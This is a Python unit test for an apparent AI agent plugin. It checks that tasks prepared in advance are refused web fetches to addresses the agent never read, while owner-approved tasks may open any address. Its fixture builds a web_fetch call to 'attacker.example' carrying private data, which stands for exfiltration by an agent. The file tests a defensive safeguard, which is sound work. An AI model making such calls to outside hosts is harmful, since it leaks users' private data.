"""A to-do prepared ahead opens only addresses it read, plain page addresses or lookups (openclaw-plugin/outbound-urls.ts
flags the rest as unread_address); Do it is the owner's ask and opens anything (SECURITY.md)."""
import unittest

import preparation_state
import test_preparation


class UnreadAddresses(unittest.TestCase):
    def setUp(self):
        self.t = test_preparation.Preparation()
        self.t.setUp()
        self.addCleanup(self.t.temp.cleanup)

    def intent(self, job_id, call_id, unread):
        args = {'job_id': job_id, 'call_id': call_id, 'tool': 'web_fetch', 'read_only': True,
                'params': {'url': 'https://attacker.example/?d=private'}}
        return self.t.app.action('preparation_tool_intent', {**args, **({'unread_address': True} if unread else {})})

    def calls(self, job_id):
        with self.t.store.connect() as db:
            return [r[0] for r in db.execute('SELECT call_id FROM preparation_calls WHERE job_id=?', (job_id,))]

    def test_a_to_do_prepared_ahead_is_refused_an_unread_address_and_carries_on(self):
        sid = self.t.ahead()['id']
        self.t.app.preparation_step(lambda _: {'status': 'admitted'})
        job_id = self.t.q('SELECT job_id FROM preparations WHERE suggestion_id=?', sid)['job_id']
        self.assertEqual(self.intent(job_id, 'leak', True), {'active': True, 'refused': preparation_state.UNREAD_ADDRESS})
        self.assertIn('web_search', preparation_state.UNREAD_ADDRESS)  # where to go instead, so the run isn't stuck
        self.assertEqual(self.calls(job_id), [])  # never journaled as a step it took
        self.assertEqual(self.intent(job_id, 'read', False), {'active': True})  # an address it read, a plain one

    def test_do_it_opens_any_address(self):
        self.t.accept()
        self.t.app.preparation_step(lambda _: {'status': 'admitted'})
        job_id = self.t.job()['job_id']
        self.assertEqual(self.intent(job_id, 'asked', True), {'active': True})
        self.assertEqual(self.calls(job_id), ['asked'])


if __name__ == '__main__':
    unittest.main()
